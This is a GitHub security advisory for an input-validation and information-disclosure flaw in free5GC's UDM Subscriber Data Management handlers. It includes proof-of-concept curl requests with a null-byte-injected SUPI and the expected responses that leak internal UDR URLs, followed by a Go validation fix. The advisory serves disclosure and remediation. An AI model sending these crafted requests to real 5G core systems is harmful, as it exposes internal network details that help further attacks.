# [H] Free5GC UDM has Improper Input Validation and Generation of Error Messages Containing Sensitive Information

## Summary
Severity: High
Advisory: GHSA-585v-hcgf-jhfr
CVE: CVE-2026-42459
CWE: CWE-20, CWE-209
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-585v-hcgf-jhfr
Type: github-advisory

## Affected
- Go: `github.com/free5gc/udm` — affected >=0

## Details
## Summary

The free5GC UDM component fails to validate the `supi` path parameter in six GET handlers of the `nudm-sdm` (Subscriber Data Management) service. An unauthenticated attacker can inject control characters into the SUPI parameter, causing UDM to forward a malformed request to UDR and return a `500 Internal Server Error` response that exposes internal infrastructure details.

## Affected Package

- **Ecosystem**: Go
- **Package**: `github.com/free5gc/udm`
- **Affected versions**: `<= v1.4.2`
- **Patched versions**: none yet

## Details

The following handlers in `internal/sbi/api_subscriberdatamanagement.go` do not call `validator.IsValidSupi()` before passing the `supi` parameter to the processor:

- `HandleGetSmfSelectData` — `GET /:supi/smf-select-data`
- `HandleGetSupi` — `GET /:supi`
- `HandleGetTraceData` — `GET /:supi/trace-data`
- `HandleGetUeContextInSmfData` — `GET /:supi/ue-context-in-smf-data`
- `HandleGetNssai` — `GET /:supi/nssai`
- `HandleGetSmData` — `GET /:supi/sm-data`

By contrast, `HandleGetAmData` in the same file correctly validates the `supi` parameter:

```go
// HandleGetAmData — correctly validates (not vulnerable)
supi := c.Params.ByName("supi")
if !validator.IsValidSupi(supi) {
    c.JSON(http.StatusBadRequest, problemDetail)
    return
}

// HandleGetSmfSelectData — missing validation (vulnerable)
supi := c.Params.ByName("supi")
// ← no validator.IsValidSupi(supi) call
s.Processor().GetSmfSelectDataProcedure(c, supi, plmnID, supportedFeatures)
```

The malformed `supi` is passed to the processor which constructs a URL to forward the request to UDR. Go's `net/url` parser rejects the URL containing control characters and returns an error. UDM catches this error and responds with a `500 SYSTEM_FAILURE` that includes the full internal UDR URL in the `detail` field.

**This is a missed fix of CVE-2026-27642**, which applied the same `validator.IsValidSupi()` check only to `internal/sbi/api_ueauthentication.go` (`HandleConfirmAuth` and `HandleGenerateAuthData`), leaving the SDM service handlers unpatched.

## Proof of Concept

```bash
# Vulnerable — returns 500 with internal UDR URL exposed
curl "http://<UDM_HOST>/nudm-sdm/v2/imsi-22277%00INJECTED/smf-select-data"
curl "http://<UDM_HOST>/nudm-sdm/v2/imsi-22277%00INJECTED/nssai"
curl "http://<UDM_HOST>/nudm-sdm/v2/imsi-22277%00INJECTED/trace-data"
curl "http://<UDM_HOST>/nudm-sdm/v2/imsi-22277%00INJECTED/sm-data"

# Expected (vulnerable) response:
# HTTP 500
# {
#   "title": "System failure",
#   "status": 500,
#   "detail": "parse \"http://udr.internal:80/nudr-dr/v2/subscription-data/imsi-22277\x00INJECTED//provisioned-data/smf-selection-subscription-data\": net/url: invalid control character in URL",
#   "cause": "SYSTEM_FAILURE"
# }

# Protected endpoint (for comparison) — returns 400
curl "http://<UDM_HOST>/nudm-sdm/v2/imsi-22277%00INJECTED/am-data"
# HTTP 400
# {"title":"Malformed request syntax","status":400,"detail":"Supi is invalid","cause":"MANDATORY_IE_INCORRECT"}
```

## Impact

An unauthenticated remote attacker can send a crafted GET request to any of the six affected endpoints to obtain:

1. Internal UDR hostname and port
2. Full internal API path structure (`/nudr-dr/v2/subscription-data/...`)
3. UDR API version
4. Internal service naming convention

This information can be used to facilitate further attacks against the UDR or other internal 5G core components.

## Recommended Fix

Add `validator.IsValidSupi()` to all six affected handlers, following the pattern already used in `HandleGetAmData`:

```go
supi := c.Params.ByName("supi")
if !validator.IsValidSupi(supi) {
    problemDetail := models.ProblemDetails{
        Title:  "Malformed request syntax",
        Status: http.StatusBadRequest,
        Detail: "Supi is invalid",
        Cause:  "MANDATORY_IE_INCORRECT",
    }
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, http.StatusText(int(problemDetail.Status)))
    c.JSON(int(problemDetail.Status), problemDetail)
    return
}
```

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-585v-hcgf-jhfr
- https://github.com/free5gc/free5gc/security/advisories/GHSA-h4wg-rp7m-8xx4
- https://nvd.nist.gov/vuln/detail/CVE-2026-42459
- https://github.com/free5gc/free5gc
- https://github.com/free5gc/udm/blob/v1.4.3/internal/sbi/api_subscriberdatamanagement.go
